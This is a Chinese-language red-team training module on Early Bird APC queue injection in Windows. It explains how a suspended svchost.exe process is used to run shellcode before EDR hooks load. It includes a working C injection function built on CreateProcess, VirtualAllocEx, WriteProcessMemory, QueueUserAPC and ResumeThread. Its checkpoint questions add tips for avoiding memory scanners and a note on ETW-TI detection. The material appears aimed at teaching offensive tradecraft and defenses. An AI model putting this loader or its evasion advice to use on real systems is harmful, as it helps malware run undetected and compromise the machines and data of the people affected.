# R22.4 Early Bird APC 佇列非同步注入技術 (Early Bird APC Queue Injection)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Early Bird APC 佇列非同步注入技術** 的物理本質為**利用 Windows 異步過程調用 (Asynchronous Procedure Call, APC) 機制與進程生命週期啟動時序差，在以掛起模式 (`CREATE_SUSPENDED`) 建立合法目標進程（如 `svchost.exe` 或 `notepad.exe`）後、在其主執行緒尚未初始化完成且防毒軟體 (AV) / 終端偵測回應 (EDR) 的用戶態監控動態庫（Hooking DLL）尚未完成注入掛鉤前，搶先將惡意 Shellcode 寫入進程記憶體並將 APC 異步回呼任務排入主執行緒佇列，隨後調用 `ResumeThread` 觸發執行**。在紅隊實戰中，這是搶在安全防護軟體「張開眼睛」前完成代碼執行的時序規避神技。

```
[紅隊載入器進程] ── 1. CreateProcess(..., CREATE_SUSPENDED) 創建掛起狀態之目標進程
       │
       ▼ [目標進程初始化階段 (尚未載入 EDR 用戶態 Hook DLL！)]
       ├── 2. VirtualAllocEx + WriteProcessMemory (在目標進程寫入 Shellcode)
       └── 3. QueueUserAPC(ShellcodeAddr, ThreadHandle, ...) (將任務排入執行緒 APC 佇列)
       │
       ▼ 4. ResumeThread(ThreadHandle) 恢復執行緒
[目標進程主執行緒進入可警示 (Alertable) 狀態 ──► 立即優先執行 APC 中的 Shellcode！]
```

## 🔬 第一動：Windows APC 機制、可警示狀態與 EDR 時序差物理機制 (Mechanics & Timing Attack)

### 1. 異步過程調用 (APC) 運行原理
- **APC 佇列**：Windows 每個執行緒都維護著自己的 APC 佇列，允許應用程式將自定義回呼函數委託給該執行緒非同步執行。
- **可警示等待 (Alertable State)**：執行緒僅在調用如 `SleepEx`、`WaitForSingleObjectEx` 等指定等待函數時進入「可警示狀態」才會執行 APC 佇列中的任務。
- **Early Bird 的時序魔法**：進程主執行緒在初始化喚醒的第一瞬間（`LdrInitializeThunk` 完成後進入正式入口點前），Windows 核心會自動將該執行緒短暫置於可警示狀態以處理系統非同步初始化，這導致排在佇列最前端的 Shellcode 能夠搶在目標入口代碼前強制執行。

### 2. 繞過 EDR 用戶層 Hooking 的物理本質
大多數傳統 EDR 透過註冊 `PsSetCreateProcessNotifyRoutine` 核心回呼感知進程建立，並在進程主執行緒啟動後注入自家的監視動態庫（如 `edrhook.dll`）來修補 API。Early Bird 在 EDR 的動態庫尚未被載入並完成 Hooking 的時間窗口內就已完成注入並開始執行，使 EDR 的應用層攔截點全數失效。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. Early Bird APC 注入核心實作 (C/C++ 代碼片段)
```c
#include <windows.h>

void EarlyBirdInject(unsigned char* shellcode, size_t sc_len) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // 1. 以掛起模式創建合法的 svchost.exe
    CreateProcessA(NULL, "C:\\Windows\\System32\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 2. 在掛起進程中分配並寫入加密 Shellcode
    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, pRemoteCode, shellcode, sc_len, NULL);

    // 3. 將 Shellcode 位址委託給目標主執行緒之 APC 佇列
    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, (ULONG_PTR)NULL);

    // 4. 恢復主執行緒執行，自動在初始化時觸發 APC 回呼
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Early Bird 注入技術相較於傳統 `CreateRemoteThread` 注入，其核心優勢是什麼？**
  - **戰術思維**：傳統注入會在目標進程正常運行時突發建立新線程，極易被 EDR 攔截；Early Bird 利用目標進程掛起初始化的時序差，在 EDR Hook 尚未就緒前就完成了注入。
- [ ] **Q2：什麼是 Windows APC 的「可警示狀態 (Alertable State)」？為什麼主執行緒被喚醒時會自動執行 APC？**
  - **戰術思維**：Windows 執行緒只有在主動進入可警示等待狀態時才會檢查並排空其 APC 佇列；在進程初始化喚醒的第一瞬間，系統核心為了完成內部環境準備會短暫進入該狀態。
- [ ] **Q3：若直接使用 `VirtualAllocEx` 分配 `PAGE_EXECUTE_READWRITE` (RWX) 記憶體，會面臨何種 EDR 靜態審計風險？**
  - **戰術思維**：私有提交 (Private Commit) 且具備 RWX 權限的記憶體頁是端點掃描器（如 Moneta）最優先標記的異常特徵，應使用先 RW 再 RX 的權限切換策略。
- [ ] **Q4：為什麼依賴純用戶態 (Ring 3) Hooking 的傳統防毒軟體完全無法攔截 Early Bird？**
  - **戰術思維**：因為用戶態 Hook 依賴於在進程啟動後向其注入安全防護 DLL，而 Early Bird 在該防護 DLL 尚未載入的空白期就已將惡意代碼排入主執行緒。
- [ ] **Q5：現代次世代 EDR 是如何從核心層 (Ring 0) 徹底破解並偵測 Early Bird 注入的？**
  - **戰術思維**：微軟在 Windows 核心引入了 ETW-TI (Threat Intelligence)，核心調用 `NtQueueApcThread` 時會直接發射核心事件，檢測向非本進程主執行緒投遞未簽名代碼的行為。
